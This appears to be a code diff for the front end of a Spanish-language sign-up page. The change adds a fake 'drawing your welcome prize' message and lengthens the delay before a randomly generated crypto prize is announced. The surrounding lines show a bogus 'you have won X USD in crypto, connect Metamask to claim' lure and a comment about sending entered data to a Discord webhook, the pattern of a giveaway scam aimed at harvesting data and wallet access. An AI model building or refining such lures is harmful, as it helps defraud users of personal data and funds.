@@ -41,6 +41,10 @@ document.getElementById('enviar').addEventListener('click', function() {
         emailAlert.style.display = 'block';
         return;
     }
+
+    document.getElementById('mensajeSorteo').textContent = 'Sorteando premio de bienvenida...';
+
+    
     const botonEnviar = document.getElementById('enviar');
     botonEnviar.textContent = "REGISTRADO";
 
@@ -53,7 +57,7 @@ document.getElementById('enviar').addEventListener('click', function() {
 
     prizeAlert.textContent = `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉 Conecta con Metamask Para cobrar tu premio!`;
     prizeAlert.style.display = 'block';
-        }, 3000); // 3000 milisegundos = 3 segundos
+        }, 5000); // 3000 milisegundos = 3 segundos
 
 
     // Enviar datos al webhook de Discord
